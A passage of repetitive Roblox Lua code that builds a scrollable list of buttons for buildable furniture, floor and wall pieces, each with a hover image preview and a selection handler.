Chair1 = Instance.new("TextButton")
Chair1.Name = "Chair1"
Chair1.Parent = BluePrint1
Chair1.BackgroundColor3 = Color3.new(0, 0, 0)
Chair1.BorderColor3 = Color3.fromRGB(151, 0, 0)
Chair1.BackgroundTransparency = 0.6
Chair1.Position = UDim2.new(0, 5, 0, 579)
Chair1.Size = UDim2.new(0, 173, 0, 20)
Chair1.Font = Enum.Font.Fantasy
Chair1.Text = "Chair (80)"
Chair1.TextColor3 = Color3.new(1, 1, 1)
Chair1.TextSize = 14
Chair1.MouseButton1Down:connect(function()
Item.Text = "Chair1"
end)

InfoText176 = Instance.new("ImageLabel")
InfoText176.Name = "ImageLabel"
InfoText176.Parent = MainFrame
InfoText176.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText176.BackgroundTransparency = 1
InfoText176.Position = UDim2.new(0, 40, 0, 200)
InfoText176.Size = UDim2.new(0, 100, 0, 100)
InfoText176.Image = "rbxassetid://3829943939"
InfoText176.Visible = false

Chair1.MouseEnter:connect(function()
InfoText176.Visible = true
end)

Chair1.MouseLeave:connect(function()
InfoText176.Visible = false
end)

Table2 = Instance.new("TextButton")
Table2.Name = "Table2"
Table2.Parent = BluePrint1
Table2.BackgroundColor3 = Color3.new(0, 0, 0)
Table2.BorderColor3 = Color3.fromRGB(151, 0, 0)
Table2.BackgroundTransparency = 0.6
Table2.Position = UDim2.new(0, 5, 0, 602)
Table2.Size = UDim2.new(0, 173, 0, 20)
Table2.Font = Enum.Font.Fantasy
Table2.Text = "Table 2 (80)"
Table2.TextColor3 = Color3.new(1, 1, 1)
Table2.TextSize = 14
Table2.MouseButton1Down:connect(function()
Item.Text = "Table2"
end)

InfoText177 = Instance.new("ImageLabel")
InfoText177.Name = "ImageLabel"
InfoText177.Parent = MainFrame
InfoText177.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText177.BackgroundTransparency = 1
InfoText177.Position = UDim2.new(0, 40, 0, 200)
InfoText177.Size = UDim2.new(0, 100, 0, 100)
InfoText177.Image = "rbxassetid://3829943096"
InfoText177.Visible = false

Table2.MouseEnter:connect(function()
InfoText177.Visible = true
end)

Table2.MouseLeave:connect(function()
InfoText177.Visible = false
end)

Table1 = Instance.new("TextButton")
Table1.Name = "Table1"
Table1.Parent = BluePrint1
Table1.BackgroundColor3 = Color3.new(0, 0, 0)
Table1.BorderColor3 = Color3.fromRGB(151, 0, 0)
Table1.BackgroundTransparency = 0.6
Table1.Position = UDim2.new(0, 5, 0, 625)
Table1.Size = UDim2.new(0, 173, 0, 20)
Table1.Font = Enum.Font.Fantasy
Table1.Text = "Table1 (80)"
Table1.TextColor3 = Color3.new(1, 1, 1)
Table1.TextSize = 14
Table1.MouseButton1Down:connect(function()
Item.Text = "Table1"
end)

InfoText178 = Instance.new("ImageLabel")
InfoText178.Name = "ImageLabel"
InfoText178.Parent = MainFrame
InfoText178.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText178.BackgroundTransparency = 1
InfoText178.Position = UDim2.new(0, 40, 0, 200)
InfoText178.Size = UDim2.new(0, 100, 0, 100)
InfoText178.Image = "rbxassetid://3829963583"
InfoText178.Visible = false

Table1.MouseEnter:connect(function()
InfoText178.Visible = true
end)

Table1.MouseLeave:connect(function()
InfoText178.Visible = false
end)

Floor1Large = Instance.new("TextButton")
Floor1Large.Name = "Floor1Large"
Floor1Large.Parent = BluePrint1
Floor1Large.BackgroundColor3 = Color3.new(0, 0, 0)
Floor1Large.BorderColor3 = Color3.fromRGB(151, 0, 0)
Floor1Large.BackgroundTransparency = 0.6
Floor1Large.Position = UDim2.new(0, 5, 0, 648)
Floor1Large.Size = UDim2.new(0, 173, 0, 20)
Floor1Large.Font = Enum.Font.Fantasy
Floor1Large.Text = "Floor 1 Large (80)"
Floor1Large.TextColor3 = Color3.new(1, 1, 1)
Floor1Large.TextSize = 14
Floor1Large.MouseButton1Down:connect(function()
Item.Text = "Floor1Large"
end)

InfoText179 = Instance.new("ImageLabel")
InfoText179.Name = "ImageLabel"
InfoText179.Parent = MainFrame
InfoText179.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText179.BackgroundTransparency = 1
InfoText179.Position = UDim2.new(0, 40, 0, 200)
InfoText179.Size = UDim2.new(0, 100, 0, 100)
InfoText179.Image = "rbxassetid://3829941159"
InfoText179.Visible = false

Floor1Large.MouseEnter:connect(function()
InfoText179.Visible = true
end)

Floor1Large.MouseLeave:connect(function()
InfoText179.Visible = false
end)

Floor1 = Instance.new("TextButton")
Floor1.Name = "Floor1"
Floor1.Parent = BluePrint1
Floor1.BackgroundColor3 = Color3.new(0, 0, 0)
Floor1.BorderColor3 = Color3.fromRGB(151, 0, 0)
Floor1.BackgroundTransparency = 0.6
Floor1.Position = UDim2.new(0, 5, 0, 671)
Floor1.Size = UDim2.new(0, 173, 0, 20)
Floor1.Font = Enum.Font.Fantasy
Floor1.Text = "Floor1 (80)"
Floor1.TextColor3 = Color3.new(1, 1, 1)
Floor1.TextSize = 14
Floor1.MouseButton1Down:connect(function()
Item.Text = "Floor1"
end)

InfoText180 = Instance.new("ImageLabel")
InfoText180.Name = "ImageLabel"
InfoText180.Parent = MainFrame
InfoText180.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText180.BackgroundTransparency = 1
InfoText180.Position = UDim2.new(0, 40, 0, 200)
InfoText180.Size = UDim2.new(0, 100, 0, 100)
InfoText180.Image = "rbxassetid://3829934791"
InfoText180.Visible = false

Floor1.MouseEnter:connect(function()
InfoText180.Visible = true
end)

Floor1.MouseLeave:connect(function()
InfoText180.Visible = false
end)

Floor1Small = Instance.new("TextButton")
Floor1Small.Name = "Cabinet1"
Floor1Small.Parent = BluePrint1
Floor1Small.BackgroundColor3 = Color3.new(0, 0, 0)
Floor1Small.BorderColor3 = Color3.fromRGB(151, 0, 0)
Floor1Small.BackgroundTransparency = 0.6
Floor1Small.Position = UDim2.new(0, 5, 0, 694)
Floor1Small.Size = UDim2.new(0, 173, 0, 20)
Floor1Small.Font = Enum.Font.Fantasy
Floor1Small.Text = "Floor1 Small (80)"
Floor1Small.TextColor3 = Color3.new(1, 1, 1)
Floor1Small.TextSize = 14
Floor1Small.MouseButton1Down:connect(function()
Item.Text = "Floor1Small"
end)

InfoText181 = Instance.new("ImageLabel")
InfoText181.Name = "ImageLabel"
InfoText181.Parent = MainFrame
InfoText181.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText181.BackgroundTransparency = 1
InfoText181.Position = UDim2.new(0, 40, 0, 200)
InfoText181.Size = UDim2.new(0, 100, 0, 100)
InfoText181.Image = "rbxassetid://3829957408"
InfoText181.Visible = false

Floor1Small.MouseEnter:connect(function()
InfoText181.Visible = true
end)

Floor1Small.MouseLeave:connect(function()
InfoText181.Visible = false
end)

Floor1Tiny = Instance.new("TextButton")
Floor1Tiny.Name = "Floor1Tiny"
Floor1Tiny.Parent = BluePrint1
Floor1Tiny.BackgroundColor3 = Color3.new(0, 0, 0)
Floor1Tiny.BorderColor3 = Color3.fromRGB(151, 0, 0)
Floor1Tiny.BackgroundTransparency = 0.6
Floor1Tiny.Position = UDim2.new(0, 5, 0, 717)
Floor1Tiny.Size = UDim2.new(0, 173, 0, 20)
Floor1Tiny.Font = Enum.Font.Fantasy
Floor1Tiny.Text = "Floor1 Tiny (80)"
Floor1Tiny.TextColor3 = Color3.new(1, 1, 1)
Floor1Tiny.TextSize = 14
Floor1Tiny.MouseButton1Down:connect(function()
Item.Text = "Floor1Tiny"
end)

InfoText182 = Instance.new("ImageLabel")
InfoText182.Name = "ImageLabel"
InfoText182.Parent = MainFrame
InfoText182.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText182.BackgroundTransparency = 1
InfoText182.Position = UDim2.new(0, 40, 0, 200)
InfoText182.Size = UDim2.new(0, 100, 0, 100)
InfoText182.Image = "rbxassetid://3829968398"
InfoText182.Visible = false

Floor1Tiny.MouseEnter:connect(function()
InfoText182.Visible = true
end)

Floor1Tiny.MouseLeave:connect(function()
InfoText182.Visible = false
end)

Floor2Large = Instance.new("TextButton")
Floor2Large.Name = "Cabinet1Thin"
Floor2Large.Parent = BluePrint1
Floor2Large.BackgroundColor3 = Color3.new(0, 0, 0)
Floor2Large.BorderColor3 = Color3.fromRGB(151, 0, 0)
Floor2Large.BackgroundTransparency = 0.6
Floor2Large.Position = UDim2.new(0, 5, 0, 740)
Floor2Large.Size = UDim2.new(0, 173, 0, 20)
Floor2Large.Font = Enum.Font.Fantasy
Floor2Large.Text = "Floor2 Large (80)"
Floor2Large.TextColor3 = Color3.new(1, 1, 1)
Floor2Large.TextSize = 14
Floor2Large.MouseButton1Down:connect(function()
Item.Text = "Floor2Large"
end)

InfoText183 = Instance.new("ImageLabel")
InfoText183.Name = "ImageLabel"
InfoText183.Parent = MainFrame
InfoText183.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText183.BackgroundTransparency = 1
InfoText183.Position = UDim2.new(0, 40, 0, 200)
InfoText183.Size = UDim2.new(0, 100, 0, 100)
InfoText183.Image = "rbxassetid://3829942151"
InfoText183.Visible = false

Floor2Large.MouseEnter:connect(function()
InfoText183.Visible = true
end)

Floor2Large.MouseLeave:connect(function()
InfoText183.Visible = false
end)

Floor2 = Instance.new("TextButton")
Floor2.Name = "Floor2"
Floor2.Parent = BluePrint1
Floor2.BackgroundColor3 = Color3.new(0, 0, 0)
Floor2.BorderColor3 = Color3.fromRGB(151, 0, 0)
Floor2.BackgroundTransparency = 0.6
Floor2.Position = UDim2.new(0, 5, 0, 763)
Floor2.Size = UDim2.new(0, 173, 0, 20)
Floor2.Font = Enum.Font.Fantasy
Floor2.Text = "Floor2 (80)"
Floor2.TextColor3 = Color3.new(1, 1, 1)
Floor2.TextSize = 14
Floor2.MouseButton1Down:connect(function()
Item.Text = "Floor2"
end)

InfoText184 = Instance.new("ImageLabel")
InfoText184.Name = "ImageLabel"
InfoText184.Parent = MainFrame
InfoText184.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText184.BackgroundTransparency = 1
InfoText184.Position = UDim2.new(0, 40, 0, 200)
InfoText184.Size = UDim2.new(0, 100, 0, 100)
InfoText184.Image = "rbxassetid://3829967796"
InfoText184.Visible = false

Floor2.MouseEnter:connect(function()
InfoText184.Visible = true
end)

Floor2.MouseLeave:connect(function()
InfoText184.Visible = false
end)

Floor2Small = Instance.new("TextButton")
Floor2Small.Name = "Floor2Small"
Floor2Small.Parent = BluePrint1
Floor2Small.BackgroundColor3 = Color3.new(0, 0, 0)
Floor2Small.BorderColor3 = Color3.fromRGB(151, 0, 0)
Floor2Small.BackgroundTransparency = 0.6
Floor2Small.Position = UDim2.new(0, 5, 0, 786)
Floor2Small.Size = UDim2.new(0, 173, 0, 20)
Floor2Small.Font = Enum.Font.Fantasy
Floor2Small.Text = "Floor2 Small (80)"
Floor2Small.TextColor3 = Color3.new(1, 1, 1)
Floor2Small.TextSize = 14
Floor2Small.MouseButton1Down:connect(function()
Item.Text = "Floor2Small"
end)

InfoText83 = Instance.new("ImageLabel")
InfoText83.Name = "ImageLabel"
InfoText83.Parent = MainFrame
InfoText83.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText83.BackgroundTransparency = 1
InfoText83.Position = UDim2.new(0, 40, 0, 200)
InfoText83.Size = UDim2.new(0, 100, 0, 100)
InfoText83.Image = "rbxassetid://3829958134"
InfoText83.Visible = false

Floor2Small.MouseEnter:connect(function()
InfoText83.Visible = true
end)

Floor2Small.MouseLeave:connect(function()
InfoText83.Visible = false
end)

Floor2Tiny = Instance.new("TextButton")
Floor2Tiny.Name = "Floor2Tiny"
Floor2Tiny.Parent = BluePrint1
Floor2Tiny.BackgroundColor3 = Color3.new(0, 0, 0)
Floor2Tiny.BorderColor3 = Color3.fromRGB(151, 0, 0)
Floor2Tiny.BackgroundTransparency = 0.6
Floor2Tiny.Position = UDim2.new(0, 5, 0, 809)
Floor2Tiny.Size = UDim2.new(0, 173, 0, 20)
Floor2Tiny.Font = Enum.Font.Fantasy
Floor2Tiny.Text = "Floor2 Tiny (80)"
Floor2Tiny.TextColor3 = Color3.new(1, 1, 1)
Floor2Tiny.TextSize = 14
Floor2Tiny.MouseButton1Down:connect(function()
Item.Text = "Floor2Tiny"
end)

InfoText185 = Instance.new("ImageLabel")
InfoText185.Name = "ImageLabel"
InfoText185.Parent = MainFrame
InfoText185.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText185.BackgroundTransparency = 1
InfoText185.Position = UDim2.new(0, 40, 0, 200)
InfoText185.Size = UDim2.new(0, 100, 0, 100)
InfoText185.Image = "rbxassetid://3832717134"
InfoText185.Visible = false

Floor2Tiny.MouseEnter:connect(function()
InfoText185.Visible = true
end)

Floor2Tiny.MouseLeave:connect(function()
InfoText185.Visible = false
end)

Wall1ShortCorner = Instance.new("TextButton")
Wall1ShortCorner.Name = "Wall1ShortCorner"
Wall1ShortCorner.Parent = BluePrint1
Wall1ShortCorner.BackgroundColor3 = Color3.new(0, 0, 0)
Wall1ShortCorner.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall1ShortCorner.BackgroundTransparency = 0.6
Wall1ShortCorner.Position = UDim2.new(0, 5, 0, 832)
Wall1ShortCorner.Size = UDim2.new(0, 173, 0, 20)
Wall1ShortCorner.Font = Enum.Font.Fantasy
Wall1ShortCorner.Text = "Wall1ShortCorner (80)"
Wall1ShortCorner.TextColor3 = Color3.new(1, 1, 1)
Wall1ShortCorner.TextSize = 14
Wall1ShortCorner.MouseButton1Down:connect(function()
Item.Text = "Wall1ShortCorner"
end)

InfoText186 = Instance.new("ImageLabel")
InfoText186.Name = "ImageLabel"
InfoText186.Parent = MainFrame
InfoText186.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText186.BackgroundTransparency = 1
InfoText186.Position = UDim2.new(0, 40, 0, 200)
InfoText186.Size = UDim2.new(0, 100, 0, 100)
InfoText186.Image = "rbxassetid://3829923351"
InfoText186.Visible = false

Wall1ShortCorner.MouseEnter:connect(function()
InfoText186.Visible = true
end)

Wall1ShortCorner.MouseLeave:connect(function()
InfoText186.Visible = false
end)

Wall1ShortThin = Instance.new("TextButton")
Wall1ShortThin.Name = "Wall1ShortThin"
Wall1ShortThin.Parent = BluePrint1
Wall1ShortThin.BackgroundColor3 = Color3.new(0, 0, 0)
Wall1ShortThin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall1ShortThin.BackgroundTransparency = 0.6
Wall1ShortThin.Position = UDim2.new(0, 5, 0, 855)
Wall1ShortThin.Size = UDim2.new(0, 173, 0, 20)
Wall1ShortThin.Font = Enum.Font.Fantasy
Wall1ShortThin.Text = "Wall1 Short Thin (80)"
Wall1ShortThin.TextColor3 = Color3.new(1, 1, 1)
Wall1ShortThin.TextSize = 14
Wall1ShortThin.MouseButton1Down:connect(function()
Item.Text = "Wall1ShortThin"
end)

InfoText187 = Instance.new("ImageLabel")
InfoText187.Name = "ImageLabel"
InfoText187.Parent = MainFrame
InfoText187.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText187.BackgroundTransparency = 1
InfoText187.Position = UDim2.new(0, 40, 0, 200)
InfoText187.Size = UDim2.new(0, 100, 0, 100)
InfoText187.Image = "rbxassetid://3829921962"
InfoText187.Visible = false

Wall1ShortThin.MouseEnter:connect(function()
InfoText187.Visible = true
end)

Wall1ShortThin.MouseLeave:connect(function()
InfoText187.Visible = false
end)

Wall1Short = Instance.new("TextButton")
Wall1Short.Name = "Wall1Short"
Wall1Short.Parent = BluePrint1
Wall1Short.BackgroundColor3 = Color3.new(0, 0, 0)
Wall1Short.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall1Short.BackgroundTransparency = 0.6
Wall1Short.Position = UDim2.new(0, 5, 0, 878)
Wall1Short.Size = UDim2.new(0, 173, 0, 20)
Wall1Short.Font = Enum.Font.Fantasy
Wall1Short.Text = "Wall1 Short (80)"
Wall1Short.TextColor3 = Color3.new(1, 1, 1)
Wall1Short.TextSize = 14
Wall1Short.MouseButton1Down:connect(function()
Item.Text = "Wall1Short"
end)

InfoText188 = Instance.new("ImageLabel")
InfoText188.Name = "ImageLabel"
InfoText188.Parent = MainFrame
InfoText188.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText188.BackgroundTransparency = 1
InfoText188.Position = UDim2.new(0, 40, 0, 200)
InfoText188.Size = UDim2.new(0, 100, 0, 100)
InfoText188.Image = "rbxassetid://3829920557"
InfoText188.Visible = false

Wall1Short.MouseEnter:connect(function()
InfoText188.Visible = true
end)

Wall1Short.MouseLeave:connect(function()
InfoText188.Visible = false
end)

Wall1Corner = Instance.new("TextButton")
Wall1Corner.Name = "Wall1Corner"
Wall1Corner.Parent = BluePrint1
Wall1Corner.BackgroundColor3 = Color3.new(0, 0, 0)
Wall1Corner.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall1Corner.BackgroundTransparency = 0.6
Wall1Corner.Position = UDim2.new(0, 5, 0, 901)
Wall1Corner.Size = UDim2.new(0, 173, 0, 20)
Wall1Corner.Font = Enum.Font.Fantasy
Wall1Corner.Text = "Wall1 Corner (80)"
Wall1Corner.TextColor3 = Color3.new(1, 1, 1)
Wall1Corner.TextSize = 14
Wall1Corner.MouseButton1Down:connect(function()
Item.Text = "Wall1Corner"
end)

InfoText189 = Instance.new("ImageLabel")
InfoText189.Name = "ImageLabel"
InfoText189.Parent = MainFrame
InfoText189.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText189.BackgroundTransparency = 1
InfoText189.Position = UDim2.new(0, 40, 0, 200)
InfoText189.Size = UDim2.new(0, 100, 0, 100)
InfoText189.Image = "rbxassetid://3829946172"
InfoText189.Visible = false

Wall1Corner.MouseEnter:connect(function()
InfoText189.Visible = true
end)

Wall1Corner.MouseLeave:connect(function()
InfoText189.Visible = false
end)

Wall1Thin = Instance.new("TextButton")
Wall1Thin.Name = "Wall1 Thin"
Wall1Thin.Parent = BluePrint1
Wall1Thin.BackgroundColor3 = Color3.new(0, 0, 0)
Wall1Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall1Thin.BackgroundTransparency = 0.6
Wall1Thin.Position = UDim2.new(0, 5, 0, 924)
Wall1Thin.Size = UDim2.new(0, 173, 0, 20)
Wall1Thin.Font = Enum.Font.Fantasy
Wall1Thin.Text = "Wall1 Thin (80)"
Wall1Thin.TextColor3 = Color3.new(1, 1, 1)
Wall1Thin.TextSize = 14
Wall1Thin.MouseButton1Down:connect(function()
Item.Text = "Wall1Thin"
end)

InfoText190 = Instance.new("ImageLabel")
InfoText190.Name = "ImageLabel"
InfoText190.Parent = MainFrame
InfoText190.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText190.BackgroundTransparency = 1
InfoText190.Position = UDim2.new(0, 40, 0, 200)
InfoText190.Size = UDim2.new(0, 100, 0, 100)
InfoText190.Image = "rbxassetid://3829949500"
InfoText190.Visible = false

Wall1Thin.MouseEnter:connect(function()
InfoText190.Visible = true
end)

Wall1Thin.MouseLeave:connect(function()
InfoText190.Visible = false
end)

Wall1 = Instance.new("TextButton")
Wall1.Name = "Wall1"
Wall1.Parent = BluePrint1
Wall1.BackgroundColor3 = Color3.new(0, 0, 0)
Wall1.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall1.BackgroundTransparency = 0.6
Wall1.Position = UDim2.new(0, 5, 0, 947)
Wall1.Size = UDim2.new(0, 173, 0, 20)
Wall1.Font = Enum.Font.Fantasy
Wall1.Text = "Wall1 (80)"
Wall1.TextColor3 = Color3.new(1, 1, 1)
Wall1.TextSize = 14
Wall1.MouseButton1Down:connect(function()
Item.Text = "Wall1"
end)

InfoText191 = Instance.new("ImageLabel")
InfoText191.Name = "ImageLabel"
InfoText191.Parent = MainFrame
InfoText191.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText191.BackgroundTransparency = 1
InfoText191.Position = UDim2.new(0, 40, 0, 200)
InfoText191.Size = UDim2.new(0, 100, 0, 100)
InfoText191.Image = "rbxassetid://3829946726"
InfoText191.Visible = false

Wall1.MouseEnter:connect(function()
InfoText191.Visible = true
end)

Wall1.MouseLeave:connect(function()
InfoText191.Visible = false
end)

Wall1TallCorner = Instance.new("TextButton")
Wall1TallCorner.Name = "Wall1TallCorner"
Wall1TallCorner.Parent = BluePrint1
Wall1TallCorner.BackgroundColor3 = Color3.new(0, 0, 0)
Wall1TallCorner.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall1TallCorner.BackgroundTransparency = 0.6
Wall1TallCorner.Position = UDim2.new(0, 5, 0, 970)
Wall1TallCorner.Size = UDim2.new(0, 173, 0, 20)
Wall1TallCorner.Font = Enum.Font.Fantasy
Wall1TallCorner.Text = "Wall1 Tall Corner (80)"
Wall1TallCorner.TextColor3 = Color3.new(1, 1, 1)
Wall1TallCorner.TextSize = 14
Wall1TallCorner.MouseButton1Down:connect(function()
Item.Text = "Wall1TallCorner"
end)

InfoText192 = Instance.new("ImageLabel")
InfoText192.Name = "ImageLabel"
InfoText192.Parent = MainFrame
InfoText192.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText192.BackgroundTransparency = 1
InfoText192.Position = UDim2.new(0, 40, 0, 200)
InfoText192.Size = UDim2.new(0, 100, 0, 100)
InfoText192.Image = "rbxassetid://3829924099"
InfoText192.Visible = false

Wall1TallCorner.MouseEnter:connect(function()
InfoText192.Visible = true
end)

Wall1TallCorner.MouseLeave:connect(function()
InfoText192.Visible = false
end)

Wall1TallThin = Instance.new("TextButton")
Wall1TallThin.Name = "Wall1TallThin"
Wall1TallThin.Parent = BluePrint1
Wall1TallThin.BackgroundColor3 = Color3.new(0, 0, 0)
Wall1TallThin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall1TallThin.BackgroundTransparency = 0.6
Wall1TallThin.Position = UDim2.new(0, 5, 0, 993)
Wall1TallThin.Size = UDim2.new(0, 173, 0, 20)
Wall1TallThin.Font = Enum.Font.Fantasy
Wall1TallThin.Text = "Wall1 Tall Thin (80)"
Wall1TallThin.TextColor3 = Color3.new(1, 1, 1)
Wall1TallThin.TextSize = 14
Wall1TallThin.MouseButton1Down:connect(function()
Item.Text = "Wall1TallThin"
end)

InfoText193 = Instance.new("ImageLabel")
InfoText193.Name = "ImageLabel"
InfoText193.Parent = MainFrame
InfoText193.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText193.BackgroundTransparency = 1
InfoText193.Position = UDim2.new(0, 40, 0, 200)
InfoText193.Size = UDim2.new(0, 100, 0, 100)
InfoText193.Image = "rbxassetid://3829927368"
InfoText193.Visible = false

Wall1TallThin.MouseEnter:connect(function()
InfoText193.Visible = true
end)

Wall1TallThin.MouseLeave:connect(function()
InfoText193.Visible = false
end)

Wall1Tall = Instance.new("TextButton")
Wall1Tall.Name = "Wall1Tall"
Wall1Tall.Parent = BluePrint1
Wall1Tall.BackgroundColor3 = Color3.new(0, 0, 0)
Wall1Tall.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall1Tall.BackgroundTransparency = 0.6
Wall1Tall.Position = UDim2.new(0, 5, 0, 1016)
Wall1Tall.Size = UDim2.new(0, 173, 0, 20)
Wall1Tall.Font = Enum.Font.Fantasy
Wall1Tall.Text = "Wall1 Tall (80)"
Wall1Tall.TextColor3 = Color3.new(1, 1, 1)
Wall1Tall.TextSize = 14
Wall1Tall.MouseButton1Down:connect(function()
Item.Text = "Wall1Tall"
end)

InfoText194 = Instance.new("ImageLabel")
InfoText194.Name = "ImageLabel"
InfoText194.Parent = MainFrame
InfoText194.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText194.BackgroundTransparency = 1
InfoText194.Position = UDim2.new(0, 40, 0, 200)
InfoText194.Size = UDim2.new(0, 100, 0, 100)
InfoText194.Image = "rbxassetid://3829924725"
InfoText194.Visible = false

Wall1Tall.MouseEnter:connect(function()
InfoText194.Visible = true
end)

Wall1Tall.MouseLeave:connect(function()
InfoText194.Visible = false
end)

Wall2ShortCorner = Instance.new("TextButton")
Wall2ShortCorner.Name = "Wall2ShortCorner"
Wall2ShortCorner.Parent = BluePrint1
Wall2ShortCorner.BackgroundColor3 = Color3.new(0, 0, 0)
Wall2ShortCorner.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall2ShortCorner.BackgroundTransparency = 0.6
Wall2ShortCorner.Position = UDim2.new(0, 5, 0, 1039)
Wall2ShortCorner.Size = UDim2.new(0, 173, 0, 20)
Wall2ShortCorner.Font = Enum.Font.Fantasy
Wall2ShortCorner.Text = "Wall2 Short Corner (80)"
Wall2ShortCorner.TextColor3 = Color3.new(1, 1, 1)
Wall2ShortCorner.TextSize = 14
Wall2ShortCorner.MouseButton1Down:connect(function()
Item.Text = "Wall2ShortCorner"
end)

InfoText195 = Instance.new("ImageLabel")
InfoText195.Name = "ImageLabel"
InfoText195.Parent = MainFrame
InfoText195.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText195.BackgroundTransparency = 1
InfoText195.Position = UDim2.new(0, 40, 0, 200)
InfoText195.Size = UDim2.new(0, 100, 0, 100)
InfoText195.Image = "rbxassetid://3829959160"
InfoText195.Visible = false

Wall2ShortCorner.MouseEnter:connect(function()
InfoText195.Visible = true
end)

Wall2ShortCorner.MouseLeave:connect(function()
InfoText195.Visible = false
end)

Wall2ShortThin = Instance.new("TextButton")
Wall2ShortThin.Name = "Wall2ShortThin"
Wall2ShortThin.Parent = BluePrint1
Wall2ShortThin.BackgroundColor3 = Color3.new(0, 0, 0)
Wall2ShortThin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall2ShortThin.BackgroundTransparency = 0.6
Wall2ShortThin.Position = UDim2.new(0, 5, 0, 1062)
Wall2ShortThin.Size = UDim2.new(0, 173, 0, 20)
Wall2ShortThin.Font = Enum.Font.Fantasy
Wall2ShortThin.Text = "Wall2 Short Thin (80)"
Wall2ShortThin.TextColor3 = Color3.new(1, 1, 1)
Wall2ShortThin.TextSize = 14
Wall2ShortThin.MouseButton1Down:connect(function()
Item.Text = "Wall2ShortThin"
end)

InfoText196 = Instance.new("ImageLabel")
InfoText196.Name = "ImageLabel"
InfoText196.Parent = MainFrame
InfoText196.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText196.BackgroundTransparency = 1
InfoText196.Position = UDim2.new(0, 40, 0, 200)
InfoText196.Size = UDim2.new(0, 100, 0, 100)
InfoText196.Image = "rbxassetid://3829961317"
InfoText196.Visible = false

Wall2ShortThin.MouseEnter:connect(function()
InfoText196.Visible = true
end)

Wall2ShortThin.MouseLeave:connect(function()
InfoText196.Visible = false
end)

Wall2Short = Instance.new("TextButton")
Wall2Short.Name = "Wall2Short"
Wall2Short.Parent = BluePrint1
Wall2Short.BackgroundColor3 = Color3.new(0, 0, 0)
Wall2Short.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall2Short.BackgroundTransparency = 0.6
Wall2Short.Position = UDim2.new(0, 5, 0, 1085)
Wall2Short.Size = UDim2.new(0, 173, 0, 20)
Wall2Short.Font = Enum.Font.Fantasy
Wall2Short.Text = "Wall2 Short (80)"
Wall2Short.TextColor3 = Color3.new(1, 1, 1)
Wall2Short.TextSize = 14
Wall2Short.MouseButton1Down:connect(function()
Item.Text = "Wall2Short"
end)

InfoText197 = Instance.new("ImageLabel")
InfoText197.Name = "ImageLabel"
InfoText197.Parent = MainFrame
InfoText197.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText197.BackgroundTransparency = 1
InfoText197.Position = UDim2.new(0, 40, 0, 200)
InfoText197.Size = UDim2.new(0, 100, 0, 100)
InfoText197.Image = "rbxassetid://3829960743"
InfoText197.Visible = false

Wall2Short.MouseEnter:connect(function()
InfoText197.Visible = true
end)

Wall2Short.MouseLeave:connect(function()
InfoText197.Visible = false
end)

Wall2Corner = Instance.new("TextButton")
Wall2Corner.Name = "Wall2Corner"
Wall2Corner.Parent = BluePrint1
Wall2Corner.BackgroundColor3 = Color3.new(0, 0, 0)
Wall2Corner.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall2Corner.BackgroundTransparency = 0.6
Wall2Corner.Position = UDim2.new(0, 5, 0, 1108)
Wall2Corner.Size = UDim2.new(0, 173, 0, 20)
Wall2Corner.Font = Enum.Font.Fantasy
Wall2Corner.Text = "Wall2 Corner (80)"
Wall2Corner.TextColor3 = Color3.new(1, 1, 1)
Wall2Corner.TextSize = 14
Wall2Corner.MouseButton1Down:connect(function()
Item.Text = "Wall2Corner"
end)

InfoText198 = Instance.new("ImageLabel")
InfoText198.Name = "ImageLabel"
InfoText198.Parent = MainFrame
InfoText198.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText198.BackgroundTransparency = 1
InfoText198.Position = UDim2.new(0, 40, 0, 200)
InfoText198.Size = UDim2.new(0, 100, 0, 100)
InfoText198.Image = "rbxassetid://3829954045"
InfoText198.Visible = false

Wall2Corner.MouseEnter:connect(function()
InfoText198.Visible = true
end)

Wall2Corner.MouseLeave:connect(function()
InfoText198.Visible = false
end)

Wall2Thin = Instance.new("TextButton")
Wall2Thin.Name = "Wall2Thin"
Wall2Thin.Parent = BluePrint1
Wall2Thin.BackgroundColor3 = Color3.new(0, 0, 0)
Wall2Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall2Thin.BackgroundTransparency = 0.6
Wall2Thin.Position = UDim2.new(0, 5, 0, 1131)
Wall2Thin.Size = UDim2.new(0, 173, 0, 20)
Wall2Thin.Font = Enum.Font.Fantasy
Wall2Thin.Text = "Wall2 Thin (80)"
Wall2Thin.TextColor3 = Color3.new(1, 1, 1)
Wall2Thin.TextSize = 14
Wall2Thin.MouseButton1Down:connect(function()
Item.Text = "Wall2Thin"
end)

InfoText199 = Instance.new("ImageLabel")
InfoText199.Name = "ImageLabel"
